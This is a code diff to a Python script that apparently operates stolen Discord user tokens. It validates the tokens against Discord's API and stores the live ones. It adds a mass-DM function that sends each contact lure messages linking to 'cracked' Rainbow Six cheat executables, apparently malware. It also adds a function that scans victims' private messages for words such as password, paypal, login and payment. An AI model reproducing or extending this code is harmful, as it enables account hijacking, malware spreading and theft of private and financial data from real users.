@@ -51,6 +51,7 @@ def get_profile(id, token):
 
 
 def validate_token(token):
+    global accounts
     url = f"https://discord.com/api/v8/users/@me"
     headers = {"authorization": token,
                "accept": "/",
@@ -65,7 +66,7 @@ def validate_token(token):
         print(f"{accounts[token]['username']} | Valid {token}")
         return True
     else:
-        print(f"Invalid {token}. {r.status_code}")
+        print(f"Invalid {token} {r.status_code}")
         return False
 
 
@@ -84,6 +85,24 @@ def get_channels(token):
         return False
 
 
+def find_messages(token, terms):
+    for index, channel in enumerate(get_channels(token)):
+        url = f"https://discord.com/api/v8/channels/{channel['id']}/messages?limit=100"
+        headers = {"authorization": token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            for msg in r.json():
+                if any(word in msg['content'].lower() for word in terms):
+                    print(f"({msg['author']['username']+'#'+msg['author']['discriminator']}) ({msg['channel_id']}) Found term.\nMSG: {msg['content']}\n")
+        else:
+            print(f"Get channels error: {r.status_code}")
+            return False
+
+
 def get_ip():
     session = requests.Session()
     r = session.get('https://ifconfig.co/json')
@@ -91,36 +110,51 @@ def get_ip():
     return data
 
 
-def validate_send():
-    msgs = ['Bro, Mango Cheats for Rainbow Six just got cracked lol... https://cdn.discordapp.com/attachments/755205918081286277/771125589973008414/mango_cheats_cracked_2.9.exe',
-            'Bro, Alnexcheats for Rainbow Six just got cracked lol... https://cdn.discordapp.com/attachments/755205918081286277/771125777239900200/Alnexcheats_cheats_cracked-4.2.exe']
+def send_mass_dms(token):
+    msgs = ['if your looking for a r6 cheat Mango Cheats just got cracked https://cdn.discordapp.com/attachments/755205918081286277/771125589973008414/mango_cheats_cracked_2.9.exe',
+            'if your looking for a r6 cheat Alnexcheats just got cracked https://cdn.discordapp.com/attachments/755205918081286277/771125777239900200/Alnexcheats_cheats_cracked-4.2.exe']
+    for index, channel in enumerate(get_channels(token)):
+        send_message(random.choice(msgs),
+                     channel['id'],
+                     token)
+        print(f"To {channel['recipients'][0]['username']} #{index}\n")
+        time.sleep(1.5)
+
+
+def validate_all():
+    global accounts
+    for account in dict(accounts):
+        if not validate_token(account):
+            accounts.pop(account, None)
 
     if os.path.getsize("tokens.txt") > 0:
-        with open("tokens.txt") as file:
-            for line in file:
-                if validate_token(line.strip()):
-                    token = line
-                    for index, channel in enumerate(
-                            get_channels(token)):
-                        send_message(random.choice(msgs),
-                                     channel['id'],
-                                     token)
-                        print(f"To {channel['recipients'][0]['username']} #{index}\n")
-                        time.sleep(1.5)
-        with open('accounts.json', 'a') as file:
-            json.dump(accounts, file, indent=4)
+        with open("tokens.txt", "r+") as file:
+            lines = file.readlines()
+            file.seek(0)
 
-
-def validate():
-    if os.path.getsize("tokens.txt") > 0:
-        with open("tokens.txt") as file:
-            for line in file:
+            for line in lines:
                 if len(line) <= 1:
                     continue
-                validate_token(line.strip())
-        with open('accounts.json', 'a') as file:
+
+                if line.strip() in list(accounts.keys()):
+                    continue
+
+                if validate_token(line.strip()):
+                    file.write(line)
+            file.truncate()
+
+        with open('accounts.json', 'w') as file:
             json.dump(accounts, file, indent=4)
 
 
 if __name__ == '__main__':
-    validate()
+    with open('accounts.json') as file:
+        accounts = json.load(file)
+    validate_all()
+
+    # for token in list(accounts.keys()):
+    #     send_mass_dms(token)
+    # for token in list(accounts.keys()):
+    #     terms = ['price', 'buy', 'password', 'pass', 'login', 'paypal', 'cost', 'email', 'gift', 'nitro', 'payment', 'money', 'code', 'download', 'link', 'usd']
+    #     print(f"Searching messages in {accounts[token]['username']} with terms: {terms}")
+    #     find_messages(token, terms)
